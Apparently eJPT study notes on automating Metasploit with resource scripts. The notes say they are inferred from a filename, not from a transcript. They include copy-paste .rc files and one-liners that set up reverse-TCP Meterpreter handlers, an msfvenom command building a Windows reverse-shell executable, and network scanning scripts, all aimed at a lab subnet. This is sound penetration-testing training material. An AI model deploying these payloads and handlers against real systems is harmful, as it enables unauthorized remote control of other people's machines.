# Automating Metasploit With Resource Scripts (eJPT Study Notes)

Note: No transcript was provided. The following is a conservative, exam-focused summary inferred from the filename/context. Commands and options are standard, widely supported Metasploit usage for .rc resource scripts.

## What the video covers (Introduction / big picture)
- How to automate repetitive Metasploit workflows using resource scripts (.rc files).
- Why .rc scripts matter: speed, consistency, reproducibility, and easy handoff to teammates.
- Two core use cases:
  - Automating common setup (workspaces, logging, DB, scanning).
  - Automating exploitation handlers and post-exploitation routines.
- Ways to run resource scripts:
  - Start msfconsole with a resource file (-r).
  - Load a resource file from inside msfconsole (resource).
  - Capture your current session into a resource file (makerc).

## Flow (ordered)
1. Plan the workflow you want to automate (scan, enumerate, handler, etc.).
2. Create a .rc file with ordered msfconsole commands (using a text editor).
3. Use setg for global variables you’ll reuse (RHOSTS, LHOST, THREADS).
4. Add logging (spool) and workspace management (workspace) for organization.
5. Run the script with msfconsole -r or inside msfconsole with resource.
6. Verify results (hosts/services/vulns/creds, jobs, sessions).
7. Optionally generate .rc from an interactive session with makerc for reuse.

## Tools highlighted
- Metasploit Framework (msfconsole)
- Resource scripts (.rc)
- msfconsole flags: -r (resource), -q (quiet), -x (execute commands)
- msfconsole commands: resource, makerc, spool, workspace, db_nmap, db_import, services, hosts, vulns, creds, jobs, sessions
- Nmap (via db_nmap or external + db_import)
- A text editor (nano, vim) to create .rc files
- Optional for testing handlers: msfvenom

## Typical command walkthrough (detailed, copy-paste friendly)

### A. Quick autopwn handler (Windows Meterpreter) via .rc
Create a reusable handler that stays running as a background job.

1) Find your VPN/local IP (replace as needed):
```bash
ip -br a | grep -E 'tun0|eth0|wlan0'
```

2) Create the resource script:
```bash
mkdir -p ~/msf-rc ~/msf-logs

cat > ~/msf-rc/autohandler_windows.rc << 'EOF'
# Log everything from this run
spool ~/msf-logs/autohandler_windows.log

# Global settings
setg LHOST 10.10.14.23
setg LPORT 4444

# Multi/handler for Windows x64 Meterpreter reverse TCP
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set ExitOnSession false

# Launch the handler as a background job; do not interact with new sessions
exploit -j -z

# Show running jobs (the handler should be listed)
jobs -l

# Optional: exit when run from -r (remove if you want console to stay open)
# exit -y

# Stop logging
spool off
EOF
```

3) Run it:
```bash
msfconsole -q -r ~/msf-rc/autohandler_windows.rc
```

4) (Optional) Generate a matching payload to test:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f exe -o ~/shell.exe
```

### B. Baseline network scan and service enumeration via .rc
This builds a workspace, runs Nmap via db_nmap, and follows up with common service version checks.

```bash
cat > ~/msf-rc/baseline_scan.rc << 'EOF'
# Create/select workspace and log output
workspace -a exam
workspace exam
spool ~/msf-logs/baseline_scan.log

# Confirm DB status
db_status

# Set the scope globally (adjust to target range)
setg RHOSTS 10.10.10.0/24

# Run Nmap and import results into the DB
db_nmap -Pn -T4 -sS -sV -O --top-ports 200 10.10.10.0/24

# Show hosts and services discovered
hosts
services

# HTTP version enumeration
use auxiliary/scanner/http/http_version
set THREADS 50
services -p 80,443 -R
run

# SMB version enumeration
use auxiliary/scanner/smb/smb_version
set THREADS 50
services -p 445 -R
run

# SSH version enumeration
use auxiliary/scanner/ssh/ssh_version
set THREADS 50
services -p 22 -R
run

# FTP version enumeration
use auxiliary/scanner/ftp/ftp_version
set THREADS 50
services -p 21 -R
run

# Summaries
hosts
services
vulns
creds

# Stop logging
spool off
EOF
```

Run it:
```bash
msfconsole -q -r ~/msf-rc/baseline_scan.rc
```

### C. Using resource inside msfconsole
If you already have an interactive console, you can load a resource:
```text
msf6 > resource ~/msf-rc/baseline_scan.rc
```

### D. Generating a resource from your session (makerc)
After manually running a useful flow, capture it to an .rc file:
```text
msf6 > makerc ~/msf-rc/saved_flow.rc
```

### E. One-liner execution with -x
Execute a short sequence without crafting a file:
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.23; set LPORT 5555; set ExitOnSession false; exploit -j -z; jobs -l; exit -y"
```

### F. Import existing scan results
If you prefer running standalone Nmap:
```bash
nmap -Pn -sS -sV -O -oX ~/scan.xml 10.10.10.0/24
msfconsole -q -x "workspace -a exam; workspace exam; db_import ~/scan.xml; hosts; services; exit -y"
```

## Practical tips
- Use setg for values reused across modules (RHOSTS, LHOST, THREADS, PROXIES).
- ExitOnSession false keeps handlers alive for multiple shells.
- exploit -j -z runs modules as background jobs and doesn’t grab your console on session open.
- Add spool at the start of scripts to capture logs; spool off at the end.
- workspace keeps each target’s data separate; use one workspace per engagement or exam task segment.
- services -p <ports> -R populates RHOSTS from the DB based on discovered services, streamlining follow-up scanners.
- Add sleep N in .rc scripts when you need to wait (e.g., after launching a handler or while expecting callbacks).
- Keep scripts modular: one for scanning, one for handlers, one for post-exploitation.
- Validate module options with show options and show advanced when building scripts.
- Clean up: jobs -K kills all jobs; sessions -K kills all sessions; unsetg NAME clears global settings.

## Minimal cheat sheet (one-screen flow)
- Run a resource on startup:
```bash
msfconsole -q -r ~/msf-rc/script.rc
```
- Load a resource in-session:
```text
resource ~/msf-rc/script.rc
```
- Capture current flow:
```text
makerc ~/msf-rc/saved_flow.rc
```
- Basic handler .rc:
```text
spool ~/msf-logs/handler.log
setg LHOST 10.10.14.23
setg LPORT 4444
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set ExitOnSession false
exploit -j -z
jobs -l
spool off
```
- Baseline scan .rc:
```text
workspace -a exam
workspace exam
spool ~/msf-logs/scan.log
setg RHOSTS 10.10.10.0/24
db_nmap -Pn -T4 -sS -sV -O --top-ports 200 10.10.10.0/24
use auxiliary/scanner/http/http_version
services -p 80,443 -R
run
use auxiliary/scanner/smb/smb_version
services -p 445 -R
run
hosts
services
spool off
```

## Summary
- Metasploit resource scripts (.rc) are simple files containing msfconsole commands that let you automate common tasks like scanning, enumeration, and handler setup.
- You can run them at startup with msfconsole -r or load them in an existing session with resource.
- Use setg for reusable parameters, spool for logging, workspace for organization, and db_nmap/db_import for integrating discovery with the Metasploit database.
- Build small, modular .rc scripts for repeatable, reliable workflows during the eJPT, and keep a minimal template you can quickly adapt to each target.